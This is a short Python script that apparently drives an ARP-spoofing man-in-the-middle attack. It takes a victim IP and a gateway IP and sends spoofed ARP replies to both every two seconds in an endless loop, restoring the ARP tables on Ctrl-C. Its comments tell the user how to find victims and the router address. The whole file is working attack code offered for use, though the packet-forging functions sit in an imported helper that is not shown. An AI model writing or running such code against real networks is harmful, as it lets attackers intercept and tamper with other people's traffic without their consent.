from mitm_helper_func import spoof, restore
import argparse
import time

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help="Target IP")
	parser.add_argument('-g', '--gateway', help="Gateway IP")
	args = parser.parse_args()

	"""
	target is the victim's IP. 
	Use networkDiscovery.py to get the list of devices that are connected to the gateway.
	"""
	target = args.target
	"""
	gateway is the router IP (usually 192.168.0.1 or 10.0.0.1 or similar).
	Use "ifconfig" in the linux terminal or "ipconfig" in Windows cmd/powershell to get the gateway address.
	"""
	gateway = args.gateway

	try:
		number_of_packets = 0
		while True:
			# we spoof as target and say to router that we are target
			spoof(gateway, target)
			# we spoof as router and say to target that we are router
			spoof(target, gateway)
			# wait 2 seconds before sending spoof packets again
			time.sleep(2)
			number_of_packets += 2
			print(f"\rSent {number_of_packets} packets", end="")
	# Restore ARP Tables before closing the attack
	except KeyboardInterrupt:
		print("\nRestoring ARP Tables...")
		restore(gateway, target)
		restore(target, gateway)

if __name__ == '__main__':
	main()
